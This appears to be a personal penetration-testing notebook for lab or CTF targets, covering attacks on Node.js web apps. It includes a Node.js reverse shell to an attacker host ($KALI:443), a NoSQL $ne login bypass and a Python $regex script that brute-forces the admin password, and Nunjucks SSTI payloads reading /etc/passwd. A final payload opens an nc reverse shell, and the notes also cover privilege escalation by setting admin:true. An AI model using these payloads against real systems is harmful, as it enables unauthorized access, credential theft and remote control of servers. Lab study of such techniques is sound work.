#### Enumeration

Capture url request in BurpSuite:

![[Pasted image 20220228102713.png]]
Take a look at /api/users

Take the list of users, and a short list of passwords, and attack the login request.

Look for something that would need elevated privilges, like /api/settings.

```
{"color-theme":"light","lang":"en","admin":false}
```

Change admin value to true:

```
{"color-theme":"dark","admin":true}
```


#### Node.js (Express middleware)
Below we're able to test this input box by adding 1 + 1
![[Pasted image 20220304092318.png]]

and seeing the result of "2".
![[Pasted image 20220304092332.png]]

Let's try something more complicated:

```node - kali
(function(){
   return 2+2;
})();
```

![[Pasted image 20220304092443.png]]

and we see this also works
![[Pasted image 20220304092547.png]]

```node - kali
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(443, "$KALI", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

![[rlwrap]]

#### NodeBlog
Details on $ne
https://docs.mongodb.com/manual/reference/operator/query/ne/

```
http://$TARGET:5000/login
```

Capture in Burp, change Content-Type to json:

```BurpSuite - kali
Content-Type: application/json
```

Change the data body to json format:

```BurpSuite - kali
{"user":"admin","password":"admin"}
```

Send, notice we still get invalid password.  If we modify the username, we get invalid username, working as intended.

```BurpSuite - kali
{
	"user":"admin",
	"password":{
		"$ne":"admin"
	}
}
```

```bash - kali
mousepad login.py
```

```python - kali
import requests
import json
import string
import sys


def login(pw):
	payload = '{ "$regex":"%s"}' % pw
	data = {"user":"admin", "password": json.loads(payload)}
	r=requests.post("http://$TARGET:5000/login",json=data)
	if "Invalid Password" in r.text:
		return False
	return True

password = '^'
stop = False
while stop == False:
	for i in string.ascii_letters:
		sys.stdout.write(f"\r{password}{i}")
		if login(f"{password}{i}"):
			password += i
			if login(f"{password}$"):
				sys.stdout.write(f"\r{password}\r\n")
				sys.stdout.flush()
				stop=True
				break
			break
```

#### Command injection

First, we notice how the our input for the newsletter is reflected back to us.

![[Pasted image 20221115132135.png]]

Test for command injection

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#detect

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

![[Pasted image 20221115132357.png]]

Capture in Burp, send to repeater.

#### Node JS command Injection
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks

POC:
```
{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}
```

Final payload:
```
{"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}@example.domain"
}
```

![[rlwrap]]

Reverse Shell
```
{"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc $KALI 443 >/tmp/f')\")()}}@example.domain"
}
```

#### package.json
If found, evaluate for vulnerable dependencies.  Maybe this is something we can combine with Dependency-Check?!

![[Pasted image 20220905142745.png]]





